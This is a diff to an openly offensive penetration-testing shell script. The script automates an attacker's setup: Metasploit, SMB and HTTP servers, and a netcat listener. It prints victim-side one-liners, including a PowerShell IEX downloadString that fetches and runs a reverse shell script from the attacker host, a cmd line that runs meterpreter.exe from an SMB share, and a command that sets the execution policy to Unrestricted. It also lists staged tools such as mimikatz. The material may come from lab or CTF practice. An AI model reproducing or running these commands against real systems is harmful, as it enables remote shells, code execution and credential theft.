@@ -59,7 +59,7 @@ echo run >> meterpreter.rc
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-xdotool key Alt+Shift+S; xdotool type "Server"; xdotool key Return
+xdotool key Alt+Shift+S; xdotool type "HTTP Server"; xdotool key Return
 clear
 echo "\t\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
 echo "\t\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
@@ -77,13 +77,14 @@ echo "\t\t                                BY TERENCE BROADBENT BSC CYBER SECURIT
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-echo "Startup Instructions:\n"
-echo "Get-ExecutionPolicy -List"
+echo '\e[1;33m'Startup Instructions:'\e[0m'
 echo "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\n"
-
+echo '\e[1;33m'Special Instructions:'\e[0m'
 while read line
   do 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:80/APT/reverseshell.ps1)'\""
+  printf "C:\Windows\System32\cmd.exe /c \\\\\\\\$line\APT\meterpreter.exe\n\n"
+  echo '\e[1;33m'Normal Usage:'\e[0m'
   echo "powershell \"iwr -Uri http://$line:80/APT/filename\" -outfile filename"
 done < $filename
 
@@ -98,11 +99,20 @@ echo "rubeus.exe							procdump64.exe							mimikatz64.exe		"
 echo "nmapsetup.exe															mimikatz32.exe          "
 echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
 
-xdotool key Ctrl+Shift+T; xdotool key Alt+Shift+S; xdotool type "Meterpreter"; xdotool key Return
 echo "[+] Starting Meterpreter..."
+xdotool key Ctrl+Shift+T; sleep 2
+xdotool key Alt+Shift+S; xdotool type "Meterpreter"; xdotool key Return; sleep 2
 xdotool type "msfconsole -r meterpreter.rc"; xdotool key Return
+
+echo "[+] Starting SMB Server..."
+xdotool key Ctrl+Shift+T; sleep 2
+xdotool key Alt+Shift+S; xdotool type "SMB Server"; xdotool key Return; sleep 2
+xdotool type "impacket-smbserver C:\tmp ./APT/ -smb2support"; xdotool key Return
+
 echo "[+] Starting HTTP server..."
-xdotool key Ctrl+Tab
+xdotool key Ctrl+Tab; sleep 2
+xdotool key Ctrl+Shift+Tab; sleep 2
+echo '\e[1;32m'Running...'\e[0m'
 python3 -m http.server 80 > output.txt
 rlwrap nc -nvlp 9001
 
